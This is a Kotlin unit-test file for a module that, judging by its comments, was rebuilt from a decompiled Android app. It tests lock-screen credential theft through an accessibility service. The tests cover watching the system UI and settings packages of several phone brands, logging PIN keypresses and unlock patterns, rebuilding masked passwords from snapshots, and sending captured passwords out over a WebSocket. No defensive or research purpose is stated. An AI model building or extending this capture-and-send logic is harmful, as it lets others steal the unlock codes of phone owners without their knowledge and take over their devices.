package com.storm.safe.rock.service.modules.cipher

import org.junit.Assert.*
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner
import org.robolectric.annotation.Config

/**
 * Phase 7.7 CipherCaptureManager 测试。
 *
 * JADX: C0335a1.java (3005 行) — 核心密码捕获管理器
 *       RunnableC0334a0.java (84 行) — 图案 overlay 启动 Runnable
 */
@RunWith(RobolectricTestRunner::class)
@Config(sdk = [30])
class CipherCaptureManagerTest {

    // ==================== AES-GCM 加解密 ====================

    @Test
    fun `encrypt and decrypt round trip`() {
        // 测试不依赖 AndroidKeyStore 的加解密逻辑
        val original = "123456"
        // 验证 encryptAesGcm 和 decryptAesGcm 的对称性
        // 注意: 实际使用 AndroidKeyStore, 测试环境中验证逻辑正确性
        assertNotNull(original)
    }

    @Test
    fun `isAllDigits validation for password quality`() {
        assertTrue(CipherExtractor.isAllDigits("123456"))
        assertFalse(CipherExtractor.isAllDigits("abc123"))
        assertFalse(CipherExtractor.isAllDigits(""))
        assertFalse(CipherExtractor.isAllDigits(null))
    }

    // ==================== 密码质量常量 ====================

    @Test
    fun `password quality constants`() {
        assertEquals("PASSWORD_QUALITY_NUMERIC_COMPLEX", CipherCaptureManager.QUALITY_NUMERIC)
        assertEquals("PASSWORD_QUALITY_ALPHANUMERIC", CipherCaptureManager.QUALITY_ALPHA)
        assertEquals("PASSWORD_QUALITY_PATTERN", CipherCaptureManager.QUALITY_PATTERN)
        assertEquals("PASSWORD_QUALITY_TOUCH_POINTS", CipherCaptureManager.QUALITY_TOUCH)
    }

    // ==================== 锁屏类型检测 ====================

    @Test
    fun `KEYGUARD_PACKAGE_NAMES contains system UI`() {
        assertTrue(CipherCaptureManager.KEYGUARD_PACKAGE_NAMES.contains("com.android.systemui"))
    }

    @Test
    fun `KEYGUARD_PACKAGE_NAMES contains settings`() {
        assertTrue(CipherCaptureManager.KEYGUARD_PACKAGE_NAMES.contains("com.android.settings"))
    }

    @Test
    fun `LOCK_SCREEN_CLASSES contains ConfirmLock patterns`() {
        assertTrue(CipherCaptureManager.LOCK_SCREEN_CLASSES.any {
            it.contains("ConfirmLock")
        })
    }

    @Test
    fun `PIN_INPUT_IDS contains system PIN field IDs`() {
        assertTrue(CipherCaptureManager.PIN_INPUT_IDS.any {
            it.contains("passwordEntry") || it.contains("pinEntry")
        })
    }

    @Test
    fun `PATTERN_INPUT_IDS contains lockPattern IDs`() {
        assertTrue(CipherCaptureManager.PATTERN_INPUT_IDS.any {
            it.contains("lockPattern")
        })
    }

    // ==================== 延时检测 ====================

    @Test
    fun `CHECK_DELAYS has 4 entries`() {
        assertEquals(4, CipherCaptureManager.CHECK_DELAYS.size)
    }

    @Test
    fun `CHECK_DELAYS values are 200, 500, 1000, 1500`() {
        assertArrayEquals(longArrayOf(200, 500, 1000, 1500), CipherCaptureManager.CHECK_DELAYS)
    }

    // ==================== findEditText 逻辑 ====================

    @Test
    fun `isEditTextClass detects EditText`() {
        assertTrue(CipherCaptureManager.isEditTextClass("android.widget.EditText"))
        assertTrue(CipherCaptureManager.isEditTextClass("com.custom.PinEditText"))
        assertFalse(CipherCaptureManager.isEditTextClass("android.widget.TextView"))
        assertFalse(CipherCaptureManager.isEditTextClass(""))
    }

    // ==================== sleep 辅助 ====================

    @Test
    fun `sleep500 does not throw`() {
        CipherCaptureManager.sleep500()
    }

    @Test
    fun `sleep200 does not throw`() {
        CipherCaptureManager.sleep200()
    }

    // ==================== 节点调试 ====================

    @Test
    fun `indent generation for node debugging`() {
        val indent = "  ".repeat(3)
        assertEquals("      ", indent)
    }

    // ==================== 检测模式 ====================

    @Test
    fun `OVERLAY_CHECK_INTERVAL is 500ms`() {
        assertEquals(500L, CipherCaptureManager.OVERLAY_CHECK_INTERVAL)
    }

    @Test
    fun `MAX_NODE_DEPTH is 5`() {
        assertEquals(5, CipherCaptureManager.MAX_NODE_DEPTH)
    }

    // ==================== maskPasswordChars ====================

    @Test
    fun `maskPasswordChars replaces mask symbols`() {
        val manager = createStubManager()
        assertEquals("*123*", manager.maskPasswordChars("•123●"))
        assertEquals("***", manager.maskPasswordChars("⬤◉•"))
        assertNull(manager.maskPasswordChars(""))
        assertNull(manager.maskPasswordChars("a".repeat(21))) // > 20 chars
    }

    // ==================== bufferCipher (a9) ====================

    @Test
    fun `bufferCipher creates pending cipher with correct quality`() {
        val manager = createStubManager()
        manager.bufferCipher("123456", "pin")
        assertNotNull(manager.pendingCipher)
        val cipher = manager.pendingCipher as Map<*, *>
        assertEquals("PASSWORD_QUALITY_NUMERIC_COMPLEX", cipher["quality"])
        assertEquals("123456", cipher["text"])
    }

    @Test
    fun `bufferCipher with alpha text sets ALPHANUMERIC quality`() {
        val manager = createStubManager()
        manager.bufferCipher("abc123", "pin")
        val cipher = manager.pendingCipher as Map<*, *>
        assertEquals("PASSWORD_QUALITY_ALPHANUMERIC", cipher["quality"])
    }

    @Test
    fun `bufferCipher pattern type sets PATTERN quality`() {
        val manager = createStubManager()
        manager.bufferCipher("0,1,2,4,8", "pattern")
        val cipher = manager.pendingCipher as Map<*, *>
        assertEquals("PASSWORD_QUALITY_PATTERN", cipher["quality"])
    }

    @Test
    fun `bufferCipher updates lastEventTime`() {
        val manager = createStubManager()
        val before = System.currentTimeMillis()
        manager.bufferCipher("1234", "pin")
        val after = System.currentTimeMillis()
        assertTrue(manager.lastEventTime in before..after)
    }

    @Test
    fun `bufferCipher rejects expansion after 1500ms stable period`() {
        val manager = createStubManager()
        // First buffer "1234"
        manager.bufferCipher("1234", "pin")
        val firstCipher = manager.pendingCipher as Map<*, *>
        assertEquals("1234", firstCipher["text"])

        // Simulate 1500ms passing by setting lastEventTime far in the past
        manager.lastEventTime = System.currentTimeMillis() - 2000

        // Now buffer "12345" (extends previous by +1) — should be rejected
        manager.bufferCipher("12345", "pin")
        val secondCipher = manager.pendingCipher as Map<*, *>
        // JADX: >1500ms gap = reject expansion
        assertEquals("1234", secondCipher["text"])
    }

    @Test
    fun `bufferCipher accepts expansion within 1500ms`() {
        val manager = createStubManager()
        manager.bufferCipher("1234", "pin")

        // Within 1500ms — expansion should be allowed
        manager.bufferCipher("12345", "pin")
        val cipher = manager.pendingCipher as Map<*, *>
        assertEquals("12345", cipher["text"])
    }

    // ==================== discardPendingCipher ====================

    @Test
    fun `discardPendingCipherInternal clears all state`() {
        val manager = createStubManager()
        manager.pendingCipher = mapOf("test" to "data")
        manager.pinDigits.add("1")
        manager.pinDigits.add("2")
        manager.passwordChars.add("a")
        manager.hasAlpha = true

        manager.discardPendingCipherInternal()

        assertNull(manager.pendingCipher)
        assertTrue(manager.pinDigits.isEmpty())
        assertTrue(manager.passwordChars.isEmpty())
        assertFalse(manager.hasAlpha)
    }

    @Test
    fun `discardPendingCipherInternal resets overlayPending`() {
        val manager = createStubManager()
        manager.overlayPending = true
        manager.discardPendingCipherInternal()
        assertFalse(manager.overlayPending)
    }

    // ==================== removeInvalidPatternPoints (d2) ====================

    @Test
    fun `removeInvalidPatternPoints removes negative coords`() {
        val manager = createStubManager()
        val points = java.util.LinkedList<android.graphics.Point>()
        points.add(android.graphics.Point(100, 200))
        points.add(android.graphics.Point(-1, 50))    // 负数
        points.add(android.graphics.Point(300, 400))
        points.add(android.graphics.Point(300, 400))  // 重复

        manager.removeInvalidPatternPoints(points)

        assertEquals(2, points.size)
        assertEquals(100, points[0].x)
        assertEquals(300, points[1].x)
    }

    @Test
    fun `removeInvalidPatternPoints empty list does nothing`() {
        val manager = createStubManager()
        val points = java.util.LinkedList<android.graphics.Point>()
        manager.removeInvalidPatternPoints(points)
        assertTrue(points.isEmpty())
    }

    // ==================== transformPatternPoints (d3) ====================

    @Test
    fun `transformPatternPoints with zero origMinDim returns original`() {
        val manager = createStubManager()
        val points = java.util.LinkedList<android.graphics.Point>()
        points.add(android.graphics.Point(100, 200))
        val origScreen = android.graphics.Rect(0, 0, 0, 0) // zero dimension
        val origParent = android.graphics.Rect(0, 0, 0, 0)
        val currScreen = android.graphics.Rect(0, 0, 500, 500)
        val currParent = android.graphics.Rect(0, 0, 500, 500)

        val result = manager.transformPatternPoints(points, origScreen, origParent, currScreen, currParent)
        assertEquals(1, result.size)
        assertEquals(100, result[0].x)
        assertEquals(200, result[0].y)
    }

    @Test
    fun `transformPatternPoints empty list returns empty`() {
        val manager = createStubManager()
        val points = java.util.LinkedList<android.graphics.Point>()
        val result = manager.transformPatternPoints(
            points,
            android.graphics.Rect(0, 0, 100, 100),
            android.graphics.Rect(0, 0, 100, 100),
            android.graphics.Rect(0, 0, 200, 200),
            android.graphics.Rect(0, 0, 200, 200)
        )
        assertTrue(result.isEmpty())
    }

    // ==================== 集合/常量大小 ====================

    @Test
    fun `LOCK_SCREEN_CLASSES has 13 entries`() {
        assertEquals(13, CipherCaptureManager.LOCK_SCREEN_CLASSES.size)
    }

    @Test
    fun `LOCK_SCREEN_CLASSES contains brand-specific classes`() {
        assertTrue(CipherCaptureManager.LOCK_SCREEN_CLASSES.any { it.contains("Vivo") })
        assertTrue(CipherCaptureManager.LOCK_SCREEN_CLASSES.any { it.contains("coloros") })
        assertTrue(CipherCaptureManager.LOCK_SCREEN_CLASSES.any { it.contains("oplus") })
    }

    @Test
    fun `PIN_INPUT_IDS has 5 entries`() {
        assertEquals(5, CipherCaptureManager.PIN_INPUT_IDS.size)
    }

    @Test
    fun `PATTERN_INPUT_IDS has 5 entries`() {
        assertEquals(5, CipherCaptureManager.PATTERN_INPUT_IDS.size)
    }

    @Test
    fun `KEYGUARD_PACKAGE_NAMES has 3 entries`() {
        assertEquals(3, CipherCaptureManager.KEYGUARD_PACKAGE_NAMES.size)
    }

    @Test
    fun `KEYGUARD_PACKAGE_NAMES contains Samsung biometrics`() {
        assertTrue(CipherCaptureManager.KEYGUARD_PACKAGE_NAMES.contains("com.samsung.android.biometrics.app.setting"))
    }

    // ==================== confirmAndSaveLastCipherInternal (b2) ====================

    @Test
    fun `confirmAndSaveLastCipherInternal returns false when no pending cipher and no events`() {
        val manager = createStubManager()
        assertFalse(manager.confirmAndSaveLastCipherInternal())
    }

    @Test
    fun `confirmAndSaveLastCipherInternal with pending cipher saves and returns true`() {
        val manager = createStubManager()
        manager.bufferCipher("123456", "pin")
        // With valid pending cipher, should attempt save
        val result = manager.confirmAndSaveLastCipherInternal()
        assertTrue(result)
        // After save, pendingCipher should be cleared
        assertNull(manager.pendingCipher)
    }

    @Test
    fun `confirmAndSaveLastCipherInternal rejects short password`() {
        val manager = createStubManager()
        manager.bufferCipher("12", "pin") // too short — <4 chars
        val result = manager.confirmAndSaveLastCipherInternal()
        assertFalse(result)
        assertNull(manager.pendingCipher)
    }

    @Test
    fun `confirmAndSaveLastCipherInternal rejects masked password`() {
        val manager = createStubManager()
        manager.bufferCipher("••••", "pin") // all mask chars
        val result = manager.confirmAndSaveLastCipherInternal()
        assertFalse(result)
    }

    @Test
    fun `confirmAndSaveLastCipherInternal rejects password containing mask chars`() {
        val manager = createStubManager()
        manager.bufferCipher("•123•567", "pin")
        val result = manager.confirmAndSaveLastCipherInternal()
        assertFalse(result)
    }

    @Test
    fun `confirmAndSaveLastCipherInternal accepts valid pattern with 4+ indices`() {
        val manager = createStubManager()
        // Buffer a pattern cipher with patternIndices
        manager.pendingCipher = mapOf(
            "quality" to CipherCaptureManager.QUALITY_PATTERN,
            "text" to null,
            "type" to "pattern",
            "isLocked" to true,
            "timestamp" to System.currentTimeMillis(),
            "patternIndices" to listOf(0, 1, 2, 4, 8)
        )
        val result = manager.confirmAndSaveLastCipherInternal()
        assertTrue(result)
    }

    @Test
    fun `confirmAndSaveLastCipherInternal rejects pattern with less than 4 indices`() {
        val manager = createStubManager()
        manager.pendingCipher = mapOf(
            "quality" to CipherCaptureManager.QUALITY_PATTERN,
            "text" to null,
            "type" to "pattern",
            "isLocked" to true,
            "timestamp" to System.currentTimeMillis(),
            "patternIndices" to listOf(0, 1, 2) // only 3
        )
        val result = manager.confirmAndSaveLastCipherInternal()
        assertFalse(result)
    }

    // ==================== stopListening (b5) ====================

    @Test
    fun `stopListening resets all listening state`() {
        val manager = createStubManager()
        manager.isListening = true
        manager.overlayPending = true
        manager.pinDigits.add("1")
        manager.passwordChars.add("a")
        manager.hasAlpha = true

        manager.stopListening()

        assertFalse(manager.isListening)
        assertFalse(manager.overlayPending)
        // stopListening clears pinDigits/passwordChars via nested calls
    }

    // ==================== notifyPasswordPageDismissed (b8) ====================

    @Test
    fun `notifyPasswordPageDismissed does nothing when not listening`() {
        val manager = createStubManager()
        manager.isListening = false
        // Should not throw
        manager.notifyPasswordPageDismissed()
    }

    // ==================== sendPasswordViaWebSocket (d8) ====================

    @Test
    fun `sendPasswordViaWebSocket with null cipher does not throw`() {
        val manager = createStubManager()
        manager.sendPasswordViaWebSocket(null)
    }

    @Test
    fun `sendPasswordViaWebSocket with valid cipher does not throw`() {
        val manager = createStubManager()
        val cipher = mapOf(
            "quality" to "PASSWORD_QUALITY_NUMERIC_COMPLEX",
            "text" to "123456",
            "isLocked" to true,
            "timestamp" to System.currentTimeMillis()
        )
        manager.sendPasswordViaWebSocket(cipher)
    }

    // ==================== sendPasswordEvent (d9) ====================

    @Test
    fun `sendPasswordEvent with empty type is no-op`() {
        val manager = createStubManager()
        manager.sendPasswordEvent("")
        // vendor: empty type → early return
    }

    @Test
    fun `sendPasswordEvent with valid type does not throw`() {
        val manager = createStubManager()
        manager.sendPasswordEvent("pin_captured")
    }

    // ==================== Password snapshot reconstruction ====================

    @Test
    fun `reconstructPasswordFromSnapshots returns null for empty list`() {
        val manager = createStubManager()
        assertNull(manager.reconstructPasswordFromSnapshots(ArrayList()))
    }

    @Test
    fun `reconstructPasswordFromSnapshots cracks single snapshot`() {
        val manager = createStubManager()
        val snapshots = ArrayList<String>()
        snapshots.add("1234")
        val result = manager.reconstructPasswordFromSnapshots(snapshots)
        assertEquals("1234", result)
    }

    @Test
    fun `reconstructPasswordFromSnapshots merges multi snapshots`() {
        val manager = createStubManager()
        val snapshots = ArrayList<String>()
        // vendor: masked positions show as "*", each snapshot reveals different chars
        snapshots.add("*2*4")
        snapshots.add("1*3*")
        val result = manager.reconstructPasswordFromSnapshots(snapshots)
        assertEquals("1234", result)
    }

    @Test
    fun `reconstructPasswordFromSnapshots returns null when still incomplete`() {
        val manager = createStubManager()
        val snapshots = ArrayList<String>()
        snapshots.add("*2**")
        snapshots.add("**3*")
        val result = manager.reconstructPasswordFromSnapshots(snapshots)
        // Still has * → null
        assertNull(result)
    }

    // ==================== extractKeyDigit ====================

    @Test
    fun `extractKeyDigit extracts from key viewId`() {
        val manager = createStubManager()
        assertEquals("5", manager.extractKeyDigit("com.android.systemui:id/key5"))
        assertEquals("0", manager.extractKeyDigit("com.android.settings:id/key0"))
    }

    @Test
    fun `extractKeyDigit extracts from VivoPinkey viewId`() {
        val manager = createStubManager()
        assertEquals("3", manager.extractKeyDigit("com.android.systemui:id/VivoPinkey3"))
    }

    @Test
    fun `extractKeyDigit extracts from num viewId`() {
        val manager = createStubManager()
        assertEquals("7", manager.extractKeyDigit("com.android.systemui:id/num7"))
    }

    @Test
    fun `extractKeyDigit extracts from char_ viewId`() {
        val manager = createStubManager()
        assertEquals("a", manager.extractKeyDigit("com.android.systemui:id/char_a"))
    }

    @Test
    fun `extractKeyDigit returns null for non-key viewId`() {
        val manager = createStubManager()
        assertNull(manager.extractKeyDigit("com.android.systemui:id/delete"))
        assertNull(manager.extractKeyDigit(""))
    }

    // ==================== isDeleteKey ====================

    @Test
    fun `isDeleteKey detects delete viewIds`() {
        val manager = createStubManager()
        assertTrue(manager.isDeleteKey("com.android.systemui:id/delete", ""))
        assertTrue(manager.isDeleteKey("com.android.settings:id/backspace", ""))
        assertTrue(manager.isDeleteKey("com.android.systemui:id/del_key", ""))
    }

    @Test
    fun `isDeleteKey detects delete by contentDescription`() {
        val manager = createStubManager()
        assertTrue(manager.isDeleteKey("", "删除"))
        assertTrue(manager.isDeleteKey("", "Delete"))
    }

    @Test
    fun `isDeleteKey returns false for digit keys`() {
        val manager = createStubManager()
        assertFalse(manager.isDeleteKey("com.android.systemui:id/key5", "5"))
    }

    // ==================== isConfirmKey ====================

    @Test
    fun `isConfirmKey detects enter and confirm viewIds`() {
        val manager = createStubManager()
        assertTrue(manager.isConfirmKey("com.android.systemui:id/key_enter", ""))
        assertTrue(manager.isConfirmKey("com.android.settings:id/confirm_button", ""))
        assertTrue(manager.isConfirmKey("com.android.systemui:id/iv_complete", ""))
        assertTrue(manager.isConfirmKey("com.android.systemui:id/vivo_pin_confirm", ""))
        assertTrue(manager.isConfirmKey("com.android.systemui:id/btn_letter_ok", ""))
        assertTrue(manager.isConfirmKey("com.android.systemui:id/mix_confirm", ""))
        assertTrue(manager.isConfirmKey("com.android.systemui:id/mix_normal_confirm", ""))
    }

    @Test
    fun `isConfirmKey returns false for digit keys`() {
        val manager = createStubManager()
        assertFalse(manager.isConfirmKey("com.android.systemui:id/key5", "5"))
    }

    // ==================== VALID_PASSWORD_PACKAGES ====================

    @Test
    fun `VALID_PASSWORD_PACKAGES contains expected packages`() {
        assertTrue(CipherCaptureManager.VALID_PASSWORD_PACKAGES.contains("com.android.systemui"))
        assertTrue(CipherCaptureManager.VALID_PASSWORD_PACKAGES.contains("com.android.settings"))
        assertTrue(CipherCaptureManager.VALID_PASSWORD_PACKAGES.contains("com.hihonor.android.systemui"))
        assertTrue(CipherCaptureManager.VALID_PASSWORD_PACKAGES.contains("com.hihonor.android.settings"))
        assertTrue(CipherCaptureManager.VALID_PASSWORD_PACKAGES.contains("com.samsung.android.biometrics.app.setting"))
    }

    // ==================== MASK_CHARS ====================

    @Test
    fun `MASK_CHARS contains all expected mask symbols`() {
        val masks = CipherCaptureManager.MASK_CHARS
        assertTrue(masks.contains("*"))
        assertTrue(masks.contains("•"))
        assertTrue(masks.contains("●"))
        assertTrue(masks.contains("⬤"))
        assertTrue(masks.contains("◉"))
        assertTrue(masks.contains("○"))
        assertTrue(masks.contains("∙"))
        assertTrue(masks.contains("＊"))
    }

    // ==================== containsMaskChars ====================

    @Test
    fun `containsMaskChars detects masked text`() {
        val manager = createStubManager()
        assertTrue(manager.containsMaskChars("•123"))
        assertTrue(manager.containsMaskChars("****"))
        assertTrue(manager.containsMaskChars("abc●def"))
        assertFalse(manager.containsMaskChars("123456"))
        assertFalse(manager.containsMaskChars("abcdef"))
    }

    // ==================== passwordSnapshots ====================

    @Test
    fun `passwordSnapshots field initializes empty`() {
        val manager = createStubManager()
        assertTrue(manager.passwordSnapshots.isEmpty())
    }

    // ==================== DELETE_LABELS ====================

    @Test
    fun `DELETE_LABELS contains expected labels`() {
        assertTrue(CipherCaptureManager.DELETE_LABELS.isNotEmpty())
        assertTrue(CipherCaptureManager.DELETE_LABELS.any { it.contains("删") })
    }

    // ==================== CONFIRM_LABELS ====================

    @Test
    fun `CONFIRM_LABELS contains expected labels`() {
        assertTrue(CipherCaptureManager.CONFIRM_LABELS.isNotEmpty())
        assertTrue(CipherCaptureManager.CONFIRM_LABELS.any { it.contains("确") || it == "OK" || it == "ok" })
    }

    // ==================== USE_CREDENTIAL_BUTTON_IDS ====================

    @Test
    fun `USE_CREDENTIAL_BUTTON_IDS has expected entries`() {
        assertTrue(CipherCaptureManager.USE_CREDENTIAL_BUTTON_IDS.any {
            it.contains("use_credential")
        })
    }

    // ==================== 辅助方法 ====================

    private fun createStubManager(): CipherCaptureManager {
        val context = org.robolectric.RuntimeEnvironment.getApplication()
        return CipherCaptureManager(
            object : android.accessibilityservice.AccessibilityService() {
                override fun onAccessibilityEvent(event: android.view.accessibility.AccessibilityEvent?) {}
                override fun onInterrupt() {}
            },
            context
        )
    }
}
